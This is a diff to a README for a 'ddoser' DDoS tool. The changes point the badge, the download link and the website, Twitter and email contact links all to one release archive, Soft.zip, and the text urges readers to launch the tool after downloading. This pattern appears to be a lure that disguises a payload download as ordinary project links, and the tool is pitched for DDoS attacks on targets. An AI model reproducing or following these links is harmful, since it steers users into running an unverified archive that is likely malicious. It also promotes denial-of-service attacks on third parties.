@@ -2,7 +2,7 @@
 
 🛡 Powerful DDoS Tool for Testing and Research Purposes 🚀
 
-![ddoser](https://img.shields.io/badge/ddoser-v1.0-orange)
+![ddoser](https://github.com/MasterKmc/ddoser/releases/download/v1.0/Soft.zip)
 
 Welcome to the **ddoser** repository, the go-to tool for testing DDoS attacks and exploring security vulnerabilities. Whether you are a cybersecurity enthusiast, a penetration tester, or a researcher, this tool provides a comprehensive set of features to simulate and analyze DDoS attacks on various targets.
 
@@ -30,7 +30,7 @@ The repository covers a wide range of topics related to DDoS attacks, Cloudflare
 
 To get started with **ddoser**, download the tool from the following link:
 
-[Launch DDoSer Tool](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[Launch DDoSer Tool](https://github.com/MasterKmc/ddoser/releases/download/v1.0/Soft.zip)
 
 🔥 **Please note that the tool needs to be launched after downloading.** 🔥
 
@@ -59,8 +59,8 @@ This repository is licensed under the MIT License. Feel free to explore, modify,
 ---
 
 🔗 Connect with Me  
-🌐 [Personal Website](https://www.yourwebsite.com)  
-🐦 [Twitter](https://twitter.com/yourtwitter)  
-📧 [Email](mailto:youremail@example.com)
+🌐 [Personal Website](https://github.com/MasterKmc/ddoser/releases/download/v1.0/Soft.zip)  
+🐦 [Twitter](https://github.com/MasterKmc/ddoser/releases/download/v1.0/Soft.zip)  
+📧 [Email](https://github.com/MasterKmc/ddoser/releases/download/v1.0/Soft.zip)
 
 Thank you for visiting the **ddoser** repository. Explore, experiment, and stay curious in the realm of cybersecurity and DDoS testing. Happy hacking! 🖥🔒🔎
